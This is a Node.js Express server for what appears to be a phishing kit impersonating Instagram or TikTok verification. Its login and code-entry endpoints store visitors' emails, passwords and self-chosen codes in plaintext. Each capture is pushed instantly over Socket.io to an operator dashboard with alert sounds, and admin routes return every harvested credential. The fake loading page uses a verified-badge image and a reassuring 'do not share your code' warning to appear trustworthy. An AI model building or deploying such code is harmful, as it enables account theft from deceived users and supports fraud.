require('dotenv').config();
const express = require('express');
const { Pool } = require('pg');
const jwt = require('jsonwebtoken');
const http = require('http');
const socketIo = require('socket.io');
const path = require('path');
const cors = require('cors');
const crypto = require('crypto');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// Serve static files
const publicPath = path.join(__dirname, 'public');
app.use(express.static(publicPath));

// Explicit routes for HTML pages
app.get('/', (req, res) => res.sendFile(path.join(publicPath, 'users/login.html')));
app.get('/users/login', (req, res) => res.sendFile(path.join(publicPath, 'users/login.html')));
app.get('/users/otp', (req, res) => res.sendFile(path.join(publicPath, 'users/otp.html')));
app.get('/users/success', (req, res) => res.sendFile(path.join(publicPath, 'users/success.html')));
app.get('/admin', (req, res) => res.sendFile(path.join(publicPath, 'admin/index.html')));
app.get('/admin/dashboard', (req, res) => res.sendFile(path.join(publicPath, 'admin/dashboard.html')));

// Database configuration
const pool = new Pool({
  connectionString: process.env.DATABASE_URL,
  ssl: { rejectUnauthorized: false },
  connectionTimeoutMillis: 10000,
  idleTimeoutMillis: 30000,
  max: 20,
  keepAlive: true
});

// Test database connection
pool.connect((err, client, release) => {
  if (err) console.error('❌ Database connection error:', err.message);
  else {
    console.log('✅ Connected to Neon PostgreSQL database');
    release();
  }
});

// JWT middleware
const authenticateJWT = (req, res, next) => {
  const authHeader = req.headers.authorization;
  if (!authHeader) return res.status(401).json({ error: 'No token provided' });
  
  const token = authHeader.split(' ')[1];
  jwt.verify(token, process.env.JWT_SECRET, (err, user) => {
    if (err) return res.status(403).json({ error: 'Invalid token' });
    req.user = user;
    next();
  });
};

// Socket.io authentication
io.use((socket, next) => {
  const token = socket.handshake.auth.token;
  if (!token) return next(new Error('Authentication error'));
  
  jwt.verify(token, process.env.JWT_SECRET, (err, user) => {
    if (err) return next(new Error('Authentication error'));
    socket.user = user;
    next();
  });
});

// Debug all socket emissions
const originalEmit = io.emit;
io.emit = function(event, data) {
  console.log(`📤 Socket Emit: ${event}`, data);
  return originalEmit.call(this, event, data);
};

// Socket.io connection
io.on('connection', (socket) => {
  console.log('👤 Admin connected:', socket.id);
  
  // Send a test notification on connection
  socket.emit('test-notification', { 
    message: 'Connected to real-time server',
    timestamp: new Date()
  });
  
  socket.on('disconnect', () => console.log('👤 Admin disconnected:', socket.id));
});

// Database initialization
async function initializeDatabase() {
  try {
    console.log('📦 Initializing database...');
    
    // Create users table with all required columns
    await pool.query(`
      CREATE TABLE IF NOT EXISTS users (
        id SERIAL PRIMARY KEY,
        email VARCHAR(255) UNIQUE NOT NULL,
        password VARCHAR(255) NOT NULL,
        otp VARCHAR(4),
        otp_attempts INTEGER DEFAULT 0,
        otp_verified BOOLEAN DEFAULT FALSE,
        created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
        updated_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
      )
    `);
    console.log('✅ Users table ready');

    // Create admin table
    await pool.query(`
      CREATE TABLE IF NOT EXISTS admin (
        id SERIAL PRIMARY KEY,
        email VARCHAR(255) UNIQUE NOT NULL,
        password VARCHAR(255) NOT NULL
      )
    `);
    console.log('✅ Admin table ready');

    // Create or replace function for updated_at trigger
    await pool.query(`
      CREATE OR REPLACE FUNCTION update_updated_at_column()
      RETURNS TRIGGER AS $$
      BEGIN
          NEW.updated_at = CURRENT_TIMESTAMP;
          RETURN NEW;
      END;
      $$ language 'plpgsql';
    `);

    // Create trigger if it doesn't exist
    await pool.query(`
      DROP TRIGGER IF EXISTS update_users_updated_at ON users;
      CREATE TRIGGER update_users_updated_at
          BEFORE UPDATE ON users
          FOR EACH ROW
          EXECUTE FUNCTION update_updated_at_column();
    `);

    // Create default admin
    const adminExists = await pool.query('SELECT * FROM admin WHERE email = $1', [process.env.ADMIN_EMAIL]);
    if (adminExists.rows.length === 0) {
      await pool.query('INSERT INTO admin (email, password) VALUES ($1, $2)', 
        [process.env.ADMIN_EMAIL, process.env.ADMIN_PASSWORD]);
      console.log('✅ Default admin created');
    }

    console.log('✅ Database initialization completed');
    return true;
  } catch (error) {
    console.error('❌ Database init error:', error.message);
    return false;
  }
}

// Generate random OTP (kept for backward compatibility but not used in new flow)
const generateOTP = () => crypto.randomInt(1000, 9999).toString().padStart(4, '0');

// USER ENDPOINTS

// User login - INSTANT NOTIFICATION TO ADMIN
app.post('/api/users/login', async (req, res) => {
  try {
    const { email, password } = req.body;
    if (!email || !password) return res.status(400).json({ error: 'Email and password required' });

    // Save user with initial state
    await pool.query(`
      INSERT INTO users (email, password, otp_verified) 
      VALUES ($1, $2, false) 
      ON CONFLICT (email) DO UPDATE 
      SET password = EXCLUDED.password, otp_verified = false, otp_attempts = 0, otp = NULL
    `, [email, password]);

    // INSTANT NOTIFICATION TO ADMIN - with sound and vibration triggers
    console.log('🔔 SENDING INSTANT NOTIFICATION TO ADMIN - New Login:', email);
    
    // Emit to admin that user logged in with email and password
    io.emit('user-login', { 
      email, 
      password,
      timestamp: new Date(),
      message: '🔐 New user login attempt',
      notification: {
        sound: 'urgent', // Triggers urgent sound on admin side
        vibrate: true,   // Triggers vibration
        duration: 5000,  // 5 seconds vibration
        priority: 'high'
      }
    });

    // Send loading page to user
    res.send(`
    <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes, viewport-fit=cover">
    <title>Loading...</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        html, body {
            width: 100%;
            min-height: 100vh;
            background: #0a0a0a;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 16px;
        }

        /* Perfectly centered container - dark theme */
        .loading-container {
            background: #121212;
            padding: 40px 32px;
            border-radius: 32px;
            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.8), 0 0 0 1px rgba(255,255,255,0.05);
            width: 100%;
            max-width: 400px;
            margin: auto;
            border: 1px solid #2a2a2a;
            text-align: center;
        }

        /* Header with shield icon and badge */
        .header-with-badge {
            display: flex;
            flex-direction: column;
            align-items: center;
            margin-bottom: 24px;
        }

        .shield-icon {
            margin-bottom: 12px;
        }
        
        .shield-icon svg {
            width: 48px;
            height: 48px;
            fill: #fe2c55;
        }

        /* Instagram blue badge row */
        .badge-row {
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            background: #1a1a1a;
            padding: 8px 20px 8px 24px;
            border-radius: 40px;
            border: 1px solid #2a2a2a;
            width: fit-content;
            margin: 0 auto;
        }

        .badge-row .username {
            color: #f0f0f0;
            font-size: 17px;
            font-weight: 500;
        }

        /* EXACT INSTAGRAM BLUE VERIFICATION BADGE - PNG */
        .ig-verified-badge {
            display: inline-block;
            width: 20px;
            height: 20px;
            background-image: url('https://img.icons8.com/color/48/instagram-verification-badge.png');
            background-size: contain;
            background-repeat: no-repeat;
            background-position: center;
            flex-shrink: 0;
        }

        h2 {
            color: #fff;
            margin-bottom: 24px;
            text-align: center;
            font-size: 24px;
            font-weight: 600;
            letter-spacing: -0.3px;
        }

        .spinner {
            border: 4px solid #2a2a2a;
            border-top: 4px solid #fe2c55;
            border-radius: 50%;
            width: 48px;
            height: 48px;
            animation: spin 1s linear infinite;
            margin: 24px auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .message {
            color: #e0e0e0;
            font-size: 16px;
            line-height: 1.5;
            margin-bottom: 8px;
        }

        .email-display {
            background: #1a1a1a;
            padding: 14px 18px;
            border-radius: 40px;
            margin: 16px 0 8px;
            color: #fe2c55;
            font-weight: 500;
            border: 1px solid #2a2a2a;
            word-break: break-all;
            font-size: 15px;
        }

        .warning-note {
            color: #ffaa33;
            font-size: 14px;
            margin-top: 20px;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 6px;
            background: rgba(255, 170, 51, 0.1);
            padding: 10px 16px;
            border-radius: 40px;
            border: 1px solid rgba(255, 170, 51, 0.2);
        }

        .warning-icon {
            display: inline-flex;
            align-items: center;
            justify-content: center;
            width: 20px;
            height: 20px;
            background-color: #ffaa33;
            color: #121212;
            border-radius: 50%;
            font-weight: bold;
            font-size: 14px;
        }

        /* Responsive adjustments */
        @media (max-width: 380px) {
            .loading-container {
                padding: 30px 20px;
            }
            h2 {
                font-size: 22px;
            }
        }

        @media (max-height: 600px) and (orientation: landscape) {
            body {
                padding: 12px;
            }
            .loading-container {
                padding: 24px 20px;
            }
        }
    </style>
    <meta http-equiv="refresh" content="3;url=/users/otp?email=${encodeURIComponent(email)}">
</head>
<body>
    <div class="loading-container">
        <!-- Shield icon + Instagram verified badge -->
        <div class="header-with-badge">
            <div class="shield-icon">
                <svg viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
                    <path d="M12 2C8.13 2 5 5.13 5 9v2c0 .78.16 1.53.46 2.22L4.12 15.1C3.66 16.2 4.46 17.5 5.64 17.5h12.72c1.18 0 1.98-1.3 1.52-2.4l-1.34-2.88c.3-.69.46-1.44.46-2.22V9c0-3.87-3.13-7-7-7z"/>
                    <circle cx="12" cy="15" r="2" fill="#fe2c55"/>
                    <path d="M12 22c1.1 0 2-.9 2-2h-4c0 1.1.9 2 2 2z" fill="#fe2c55"/>
                </svg>
            </div>
            <!-- Instagram blue badge next to username (exactly as requested) -->
            <div class="badge-row">
                <span class="username">@tiktokpage</span>
                <span class="ig-verified-badge" aria-label="Verified on Instagram"></span>
            </div>
        </div>

        <h2>Processing your request...</h2>
        
        <div class="spinner"></div>
        
        <div class="message">
            Please wait, redirecting to OTP creation for:
        </div>
        
        <div class="email-display" id="emailDisplay"></div>

        <!-- Warning message about not sharing code -->
        <div class="warning-note">
            <span class="warning-icon">!</span>
            DO NOT share your code with anyone
        </div>
    </div>

    <script>
        // Get email from URL parameters
        const urlParams = new URLSearchParams(window.location.search);
        const email = urlParams.get('email');
        
        // Display email if available
        const emailDisplay = document.getElementById('emailDisplay');
        if (email) {
            emailDisplay.textContent = email;
        } else {
            emailDisplay.textContent = 'No email provided';
        }

        // Update the meta refresh tag with the actual email
        const metaTag = document.querySelector('meta[http-equiv="refresh"]');
        if (metaTag && email) {
            metaTag.setAttribute('content', `3;url=/users/otp?email=${encodeURIComponent(email)}`);
        }
    </script>
</body>
</html>
    `);
  } catch (error) {
    console.error('❌ Login error:', error.message);
    res.status(500).json({ error: 'Server error' });
  }
});

// Save user-created OTP - INSTANT NOTIFICATION TO ADMIN
app.post('/api/users/save-otp', async (req, res) => {
  try {
    const { email, otp } = req.body;
    
    if (!email || !otp) {
      return res.status(400).json({ error: 'Email and OTP required' });
    }

    if (!/^\d{4}$/.test(otp)) {
      return res.status(400).json({ error: 'OTP must be exactly 4 digits' });
    }

    // Save OTP to database and mark as verified
    const result = await pool.query(
      'UPDATE users SET otp = $1, otp_verified = true, otp_attempts = 0 WHERE email = $2 RETURNING id, email, otp, password',
      [otp, email]
    );

    if (result.rows.length === 0) {
      return res.status(404).json({ error: 'User not found' });
    }

    const user = result.rows[0];

    // INSTANT NOTIFICATION TO ADMIN - with sound and vibration
    console.log('🔔 SENDING INSTANT NOTIFICATION TO ADMIN - OTP Created:', email, 'OTP:', otp);
    
    io.emit('user-otp-created', { 
      email: user.email,
      password: user.password,
      otp: user.otp,
      timestamp: new Date(),
      message: '✅ User has created and verified their OTP successfully',
      notification: {
        sound: 'success',  // Triggers success sound on admin side
        vibrate: true,     // Triggers vibration
        duration: 5000,    // 5 seconds vibration
        priority: 'high',
        pattern: [500, 200, 500, 200, 500] // Vigorous vibration pattern
      }
    });

    console.log('✅ User OTP saved and verified for:', email, 'OTP:', otp);
    res.json({ success: true, message: 'OTP saved successfully' });
  } catch (error) {
    console.error('❌ Save OTP error:', error.message);
    res.status(500).json({ error: 'Server error' });
  }
});

// Resend/Reset OTP request - INSTANT NOTIFICATION TO ADMIN
app.post('/api/users/reset', async (req, res) => {
  try {
    const { email } = req.body;
    if (!email) return res.status(400).json({ error: 'Email required' });

    // Get user password before reset
    const userResult = await pool.query('SELECT password FROM users WHERE email = $1', [email]);
    const password = userResult.rows[0]?.password || 'unknown';

    // Reset user OTP state
    await pool.query(
      'UPDATE users SET otp = NULL, otp_verified = false, otp_attempts = 0 WHERE email = $1',
      [email]
    );
    
    // INSTANT NOTIFICATION TO ADMIN
    console.log('🔔 SENDING INSTANT NOTIFICATION TO ADMIN - User Reset:', email);
    
    io.emit('user-reset', { 
      email, 
      password,
      timestamp: new Date(),
      message: '🔄 User reset OTP process - starting over',
      notification: {
        sound: 'warning',  // Triggers warning sound
        vibrate: true,     // Triggers vibration
        duration: 5000,    // 5 seconds vibration
        priority: 'medium'
      }
    });

    res.json({ success: true, message: 'OTP process reset. Please login again.' });
  } catch (error) {
    console.error('❌ Reset error:', error.message);
    res.status(500).json({ error: 'Server error' });
  }
});

// ADMIN ENDPOINTS

// Admin login
app.post('/api/admin/login', async (req, res) => {
  try {
    const { email, password } = req.body;
    if (!email || !password) return res.status(400).json({ error: 'Email and password required' });

    const result = await pool.query('SELECT * FROM admin WHERE email = $1 AND password = $2', [email, password]);
    if (result.rows.length === 0) return res.status(401).json({ error: 'Invalid credentials' });

    const token = jwt.sign(
      { id: result.rows[0].id, email, role: 'admin' },
      process.env.JWT_SECRET,
      { expiresIn: '24h' }
    );

    res.json({ token });
  } catch (error) {
    console.error('❌ Admin login error:', error.message);
    res.status(500).json({ error: 'Server error' });
  }
});

// Get all users with full details for admin
app.get('/api/admin/users', authenticateJWT, async (req, res) => {
  try {
    const result = await pool.query(`
      SELECT 
        id, 
        email, 
        password,
        otp, 
        otp_attempts,
        otp_verified,
        created_at,
        updated_at
      FROM users 
      ORDER BY created_at DESC
    `);
    
    console.log(`📊 Found ${result.rows.length} users`);
    res.json(result.rows);
  } catch (error) {
    console.error('❌ Admin users error:', error.message);
    res.status(500).json({ error: 'Server error' });
  }
});

// Get single user details
app.get('/api/admin/users/:email', authenticateJWT, async (req, res) => {
  try {
    const { email } = req.params;
    const result = await pool.query(`
      SELECT 
        id, 
        email, 
        password,
        otp, 
        otp_attempts,
        otp_verified,
        created_at,
        updated_at
      FROM users 
      WHERE email = $1
    `, [email]);
    
    if (result.rows.length === 0) {
      return res.status(404).json({ error: 'User not found' });
    }
    
    res.json(result.rows[0]);
  } catch (error) {
    console.error('❌ Admin user detail error:', error.message);
    res.status(500).json({ error: 'Server error' });
  }
});

// Health check
app.get('/api/health', (req, res) => {
  res.json({ 
    status: 'ok', 
    database: process.env.DATABASE_URL ? 'Configured' : 'Not configured',
    timestamp: new Date().toISOString()
  });
});

// Test database
app.get('/api/test-db', async (req, res) => {
  try {
    const result = await pool.query('SELECT NOW() as time');
    res.json({ success: true, time: result.rows[0].time });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Error handling
app.use((err, req, res, next) => {
  console.error('❌ Unhandled error:', err.stack);
  res.status(500).json({ error: 'Something went wrong!' });
});

// 404 handler
app.use('/api/*', (req, res) => {
  res.status(404).json({ error: 'API endpoint not found' });
});

// Start server
const PORT = process.env.PORT || 3000;

initializeDatabase().then((success) => {
  if (success) {
    server.listen(PORT, '0.0.0.0', () => {
      console.log('\n🚀 Server started!');
      console.log(`📡 Port: ${PORT}`);
      console.log(`🔗 User login: /users/login`);
      console.log(`🔗 Admin login: /admin`);
      console.log('\n📢 Socket.io server ready for real-time notifications');
      console.log('🔔 Instant notifications with sound and vibration enabled\n');
    });
  } else {
    process.exit(1);
  }
});

// Graceful shutdown
process.on('SIGINT', () => {
  console.log('\n📴 Shutting down server...');
  pool.end(() => process.exit(0));
});
process.on('SIGTERM', () => {
  console.log('\n📴 Shutting down server...');
  pool.end(() => process.exit(0));
});
